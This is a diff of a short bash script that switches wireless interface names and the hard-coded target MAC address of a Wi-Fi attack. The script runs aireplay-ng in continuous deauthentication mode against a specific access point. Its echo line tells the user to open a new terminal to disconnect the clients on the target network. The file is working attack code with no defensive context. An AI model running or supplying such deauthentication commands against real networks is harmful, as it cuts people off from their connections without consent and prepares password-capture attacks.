@@ -1,7 +1,10 @@
 #!/bin/bash
  
-port="wlp1s0"
-monport="wlp1s0mon"  
+
+# port="wlp1s0"
+# monport="wlp1s0mon"  
+port="wlxe894f6236dc9"
+monport="wlan0mon"  
  
 BSSID="3C:7C:3F:B5:F3:A8"
  
@@ -9,4 +12,4 @@ echo  "Open a new terminal window to disconnect the clients connected to the tar
 
  
 sudo aireplay-ng -0 0 -a $BSSID  $monport    
-echo  sudo aireplay-ng -0 0 -a B2:BB:E5:A4:DA:07 wlp1s0mon
+echo  sudo aireplay-ng -0 0 -a 3C:7C:3F:B5:F3:A0  wlp1s0mon
